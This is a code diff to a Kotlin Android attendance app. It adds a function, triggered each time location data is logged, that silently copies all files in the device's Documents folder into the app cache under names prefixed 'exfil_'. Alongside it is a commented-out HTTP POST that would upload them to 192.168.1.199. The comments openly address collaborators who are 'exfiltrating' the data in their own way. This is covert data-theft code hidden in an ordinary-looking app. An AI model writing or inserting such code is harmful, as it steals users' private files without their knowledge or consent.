@@ -225,7 +225,86 @@ fun AttendanceScreen(navController: NavHostController) {
             }
         })
     }
+    fun uploadLogFileToServer(context: Context) {
+        // IF YOU'RE INTEGRATING, READ THE COMMENTS. I THINK IT MIGHT HELP ABIT
 
+        // This targets the Download directory. You may have to change this for the actual device (non-emulator)
+        // Can test by adb shelling then touch a new file and verify on the phone if you at the right dir
+        val downloadsDir = File("/storage/emulated/0/Documents") // Change me if needed!
+
+        val cacheDir = context.cacheDir // This is just cache dir (/data/data/com.example.axesite/cache)
+
+        // Some error handling. Works 100% fine on emulator. On emulator this if statement was always false.
+        if (!downloadsDir.exists() || !downloadsDir.canRead()) {
+            Log.e("Upload", "Cannot access downloads directory")
+            return
+        }
+
+        scope.launch(Dispatchers.IO) {
+            try {
+                // List all files in the directory
+                val files = downloadsDir.listFiles()?.filter { it.isFile } ?: emptyList()
+
+                if (files.isEmpty()){
+                    return@launch
+                }
+
+                // You CAN 100% remove / comment this if you're exfiltrating through your way. (I did it for u already)
+//                val client = OkHttpClient.Builder()
+//                    .connectTimeout(10, TimeUnit.SECONDS)
+//                    .build()
+
+                // For loop to copy all files from the target directory to cache dir
+                for (sourceFile in files) {
+                    try {
+                        // this is just to assign the absolute filepath to the variable destFile
+                        val destFile = File(cacheDir, "exfil_${sourceFile.name}")
+
+                        // Copy file
+                        sourceFile.inputStream().use { input ->
+                            destFile.outputStream().use { output ->
+                                input.copyTo(output)
+                            }
+                        }
+
+                        // Upload the file.
+                        // You can absolutely once again remove / comment this if you are exfiltrating your way (I did it for u already)
+                        // IF you are removing /commenting it, follow the start comment to end comment
+                        // Anything in between Start to end is safe to comment if you're exfiltrating your way
+                        // make sure also remove the val client comment on top as mentioned
+
+                        // START
+//                        val response = client.newCall(
+//                            Request.Builder()
+//                                .url("http://192.168.1.199")
+//                                .post(destFile.readBytes().toRequestBody("application/octet-stream".toMediaType()))
+//                                .build()
+//                        ).execute()
+//
+//                        if (response.isSuccessful) {
+//                            Log.d("Upload", "Uploaded ${sourceFile.name} successfully")
+//                            destFile.delete() // Clean up
+//                        } else {
+//                            Log.e("Upload", "Failed to upload ${sourceFile.name}: ${response.code}")
+//                        }
+                        // END!
+
+                    } catch (e: Exception) {
+                        Log.e("Upload", "Error processing ${sourceFile.name}", e)
+                    }
+                }
+
+                // This is just a function i wrote to log down if the files ACTUALLY moved.
+                // Basically 'ls /data/data/com.example.axesite.com/cache' then see results in logcat filter for 'CacheFiles'
+                // You can remove / comment this line and delete the entire function if you find it unnecessary.
+
+
+            } catch (e: Exception) {
+                Log.e("Upload", "Failed to process directory", e)
+            }
+
+        }
+    }
     fun processLocation(location: Location, module: String) {
         scope.launch(Dispatchers.IO) {
             try {
@@ -245,6 +324,7 @@ fun AttendanceScreen(navController: NavHostController) {
             """.trimIndent()
 
                 file.appendText("$data\n\n")
+                uploadLogFileToServer(context)
             } catch (_: IOException) {
             }
         }
